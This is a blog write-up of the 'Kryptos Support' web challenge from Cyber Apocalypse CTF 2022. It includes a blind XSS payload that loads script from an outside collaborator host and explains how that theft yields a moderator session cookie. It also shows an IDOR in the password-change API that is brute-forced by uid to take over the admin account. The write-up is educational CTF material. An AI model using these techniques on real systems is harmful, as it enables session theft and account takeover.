<!DOCTYPE html> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Web - Kryptos Support Writeup | Dwiki Kusuma</title> <meta name="author" content="Dwiki Kusuma"> <meta name="description" content="Writeup for Kryptos Support Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.21.4/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%A7%83&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://qlkwej.github.io/blog/2022/web-kryptos-support/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src="/assets/js/distillpub/template.v2.js"></script> <script src="/assets/js/distillpub/transforms.v2.js"></script> <script src="/assets/js/distillpub/overrides.js"></script> </head> <body> <d-front-matter> <script async type="text/json">{
      "title": "Web - Kryptos Support Writeup",
      "description": "Writeup for Kryptos Support Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase",
      "published": "May 15, 2022",
      "authors": [
        {
          "author": "Dwiki Kusuma",
          "authorURL": "https://twitter.com/qlkwej",
          "affiliations": [
            {
              "name": "qlkwej",
              "url": ""
            }
          ]
        }
        
      ],
      "katex": {
        "delimiters": [
          {
            "left": "$",
            "right": "$",
            "display": false
          },
          {
            "left": "$$",
            "right": "$$",
            "display": true
          }
        ]
      }
    }</script> </d-front-matter> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">Dwiki </span>Kusuma</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="post distill"> <d-title> <h1>Web - Kryptos Support Writeup</h1> <p>Writeup for Kryptos Support Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase</p> </d-title> <d-byline></d-byline> <d-article> <d-contents> <nav class="l-text figcaption"> <h3>Contents</h3> <div><a href="#tl-dr">TL;DR</a></div> <div><a href="#challenge-description">Challenge Description</a></div> <div><a href="#problem">Problem</a></div> <div><a href="#attack-vectors">Attack vectors</a></div> <ul> <li><a href="#checking-the-ticket-creating-process">Checking the ticket creating process</a></li> </ul> <div><a href="#solution">Solution</a></div> <div><a href="#lesson-learned">Lesson Learned</a></div> <ul> <li><a href="#login-using-default-password">Login using default password</a></li> <li><a href="#bypass-client-side-validation">Bypass client-side validation</a></li> </ul> </nav> </d-contents> <details><summary>Disclaimer</summary> <p>I am not a CTF addict nor maniac, I do CTF for fun and learning purpose. So, if you are looking for a writeup that is very detailed and easy to understand, I suggest you to find another writeup.</p> <p>This writeup is just a note for myself and maybe for someone who is looking for a hint to solve the challenge. Feedback / comments / PRs are welcome :)</p> </details> <h2 id="tldr">TL;DR</h2> <p>This writeup is about Kryptos Support challenge from Cyber Apocalypse CTF 2022 - Intergalactic Chase. To get the flag we need to chain a blind XSS and IDOR vulnerability.</p> <h2 id="challenge-description">Challenge Description</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>Upon checking the challenge description, we are given a short description about the challenge.</p> <blockquote> <p>The secret vault used by the longhir’s planet council, Kryptos, contains some very sensitive state secret that Virgil adn Ramona are after to prove injustice performed by the commision. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can inflitrate this system?</p> </blockquote> <p>Let start the challenge by visiting the given link.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <hr> <h2 id="problem">Problem</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>The application is a reporting website that allows user to report a problem. There is a keyword <code class="language-plaintext highlighter-rouge">an admin will review your ticket shortly</code>. So, I assume there is a cronjob that run behind the scene to check the ticket and send the report to the admin.</p> <hr> <h2 id="attack-vectors">Attack vectors</h2> <p>Let’s do basic recon to get more information about the application. I use gobuster<d-footnote>https://github.com/OJ/gobuster</d-footnote> for this purpuse and found several directory, such as:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- admin
- logout
- login
- static
- settings
- tickets
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>So we have two piece of puzzle as a <code class="language-plaintext highlighter-rouge">hints</code>, which was:</p> <ol> <li>The admin will review the ticket shortly.</li> <li>The mentioned page / directory above.</li> </ol> <p>The best case scenario is the admin will review the ticket (which contaions blind XSS or CSRF vulnerability) and login to the application. So, we can login to the dashboard (maybe). But the question is, where is the starting point?</p> <h3 id="checking-the-ticket-creating-process">Checking the ticket creating process</h3> <p>Let’s create a ticket and see what happen behind the scene. I use burp suite to intercept the request and send it to repeater.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>The request is a POST request with a JSON body to <code class="language-plaintext highlighter-rouge">POST /api/tickets/add</code>. The body contains a <code class="language-plaintext highlighter-rouge">message</code> of the ticket, and it returns a response which indicates the admin will review our message shortly.</p> <p>Okay, this is maybe the starting point. Let’s try to inject a XSS payload to the message and see what happen.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>I use a vanilla javascript payload with the burpsuite collabolator URL as the endpoint. The payload is <code class="language-plaintext highlighter-rouge">"&gt;&lt;script src="https://collabolator/test.js"&gt;&lt;/script&gt;</code>.</p> <p>I receive a DNS and HTTP request from the application server to the collabolator server. So, the application is vulnerable to blind XSS.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>The next step is to steal the cookie if it’s using a cookie based authentication using XMLHttpRequest <d-footnote>https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials</d-footnote>.</p> <p>I create a dummy server using ngrok <d-footnote>https://ngrok.com/</d-footnote> to host the javascript exploit and use it to receive the request from the application server.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-10.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>I receive a request from the application server and it contains a cookie. So, the application is using a cookie based authentication. Because if it’s using a header based authentication, the exploit won’t work.</p> <hr> <h2 id="solution">Solution</h2> <p>Checking the session cookie format, it is a JWT token. So, we can decode the token and see what is inside the token.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-11.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>Based on the <code class="language-plaintext highlighter-rouge">payload data</code> it is the <code class="language-plaintext highlighter-rouge">moderator</code> session. But why not <code class="language-plaintext highlighter-rouge">admin</code> ? Perhaps there still one missing piece, but will keep it for observation later.</p> <p>Use the session cookie from the previous step to login to the application. I use the <code class="language-plaintext highlighter-rouge">Cookie Editor</code> extension <d-footnote> https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ </d-footnote>for firefox to change the cookie value.</p> <p>I can login to the application and see the dashboard. But, there is no flag in the dashboard. So, I assume the flag is in the admin dashboard. I check all the feature in <code class="language-plaintext highlighter-rouge">moderator</code> dashboard and found a <code class="language-plaintext highlighter-rouge">change password</code> feature which is vulnerable to IDOR.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-12.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-13.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>When I put the new password, it will send a POST request to <code class="language-plaintext highlighter-rouge">POST /api/users/update</code> with a JSON body. The body contains a <code class="language-plaintext highlighter-rouge">password</code> and <code class="language-plaintext highlighter-rouge">uid</code> field. The IDOR vulnearbility was in <code class="language-plaintext highlighter-rouge">uid</code>. IF we can change the <code class="language-plaintext highlighter-rouge">uid</code> value to the <code class="language-plaintext highlighter-rouge">uid</code> own by the <code class="language-plaintext highlighter-rouge">admin</code> we can change the admin password. Since it’s a increamental number, so we can bruteforce it from 001-999 <em>(the current user is moderator with <code class="language-plaintext highlighter-rouge">uid</code> 100 so admin must be between that range)</em>.</p> <p>After several iteration, we found the admin <code class="language-plaintext highlighter-rouge">uid</code> it is <code class="language-plaintext highlighter-rouge">uid: 001</code></p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-14.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>Change the admin password on the <code class="language-plaintext highlighter-rouge">change password</code> feature and login to the admin dashboard. The flag is in the admin dashboard.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-15.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>flag: <code class="language-plaintext highlighter-rouge">HTB{x55_4nd_id0rs_ar3_fun!!}</code></p> <hr> <h2 id="lesson-learned">Lesson Learned</h2> <p>I learn several things from this challenge:</p> <h3 id="login-using-default-password">Login using default password</h3> <p>The easiest way to login to the application is to use the default password. I try to use <code class="language-plaintext highlighter-rouge">admin:admin</code> but it won’t work. But, it’s not a bad idea to try the default password first, because in realworld this scenario is still happen.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h3 id="bypass-client-side-validation">Bypass client-side validation</h3> <p>At first, I check the client-side login validation. Whether it using a weak validation and I can bypass the flow. But, turns out it’s a rabbit hole. It’s only give us information if the login were successfull, it will redirected to <code class="language-plaintext highlighter-rouge">/tickets</code> page</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> </d-article> <d-appendix> <d-footnote-list></d-footnote-list> <d-citation-list></d-citation-list> </d-appendix> <d-bibliography src="/assets/bibliography/"></d-bibliography><div id="giscus_thread" style="max-width: 800px; margin: 0 auto;"> <script>let giscusTheme=localStorage.getItem("theme"),giscusAttributes={src:"https://giscus.app/client.js","data-repo":"qlkwej/qlkwej.github.io","data-repo-id":"R_kgDOJ99hCg","data-category":"General","data-category-id":"DIC_kwDOJ99hCs4CYD9z","data-mapping":"title","data-strict":"1","data-reactions-enabled":"1","data-emit-metadata":"0","data-input-position":"bottom","data-theme":giscusTheme,"data-lang":"en",crossorigin:"anonymous",async:""},giscusScript=document.createElement("script");Object.entries(giscusAttributes).forEach(([t,e])=>giscusScript.setAttribute(t,e)),document.getElementById("giscus_thread").appendChild(giscusScript);</script> <noscript>Please enable JavaScript to view the <a href="http://giscus.app/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by giscus.</a> </noscript> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2023 Dwiki Kusuma. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>